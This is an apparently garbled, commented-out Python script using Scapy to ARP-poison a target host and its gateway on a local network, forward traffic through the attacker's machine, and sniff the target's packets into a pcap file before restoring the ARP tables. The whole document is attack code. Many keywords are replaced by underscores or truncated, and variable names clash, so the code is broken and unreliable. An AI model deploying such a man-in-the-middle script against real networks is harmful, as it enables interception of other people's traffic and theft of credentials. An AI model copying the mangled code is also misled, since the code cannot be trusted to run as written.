# ______ __, ___, m..
# ____ scapy.all ______ *
#
# interface _ "eth0"
# targetIP _ "192.168.229.135"
# gateIP _ "192.168.229.2"
# packets _ 99999
# logfile _ "log.pcap"
# bc__t _ "ff:ff:ff:ff:ff:ff"
#
# ___ ip2mac ip
#     rsp _ srp1 E..dst_bc__t) / ARP(pdst_ip), ti.._2 re.._3
#     r_ ? E...s..
#
# ___ arpPoison gateIp, gateMac, targetIp, targetMac
#     w__ T..
#         ___
#             print("[*] ARP poisoning [CTRL-C to stop]")
#             s..(ARP(op_2, psrc_gateIp, pdst_targetIp, hwdst_targetMac))
#             s..(ARP(op_2, psrc_targetIP, pdst_gateIp, hwdst_gateMac))
#             t__.s..(2)
#         ______ K..
#             p__s
#
# ___ arpRestore(gateIp, gateMac, targetIp, targetMac
#     ___ x __ ra.. 5
#         print("[*] Restoring ARP table [" + st.(x) + " of 4]")
#         s..(ARP(op_2, psrc_gateIp, pdst_targetIp, hwdst_bc__t, hwsrc_gateMac), count_5)
#         s..(ARP(op_2, psrc_targetIp, pdst_gateIp, hwdst_bc__t, hwsrc_targetMac), count_5)
#         t__.s..(2)
#
# __ _______ __ '__main__':
#     conf.iface _ interface
#     conf.verb _ 0
#     gateMac _ ip2mac(gateIP)
#     targetMac _ ip2mac(targetIP)
#     print ("[*] Interface: " + interface)
#     print ("[*] Gateway: " + gateIP + " [" + gateMac + "]")
#     print ("[*] Target: " + targetIP + " [" + targetMac + "]")
#     print ("[*] Enabling Packet Forwarding")
#     __.system("/sbin/sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1")
#
#     p_?.Process(t.._arpPoison, args_(gateIP, gateMac, targetIP, targetMac,))
#     p.start
#
#     print("[*] Sniffing Packets")
#     packets _ sniff(count_packets, filter_("ip host " + targetIP), iface_interface)
#     wrpcap(logfile, packets)
#     p.terminate
#     print("[*] Sniffing Complete")
#
#     print ("[*] Disable Packet Forwarding")
#     __.system("/sbin/sysctl -w net.ipv4.ip_forward=0 >/dev/null 2>&1")
#     arpRestore(gateIP, gateMac, targetIP, targetMac)
#     print ("[*] Exiting")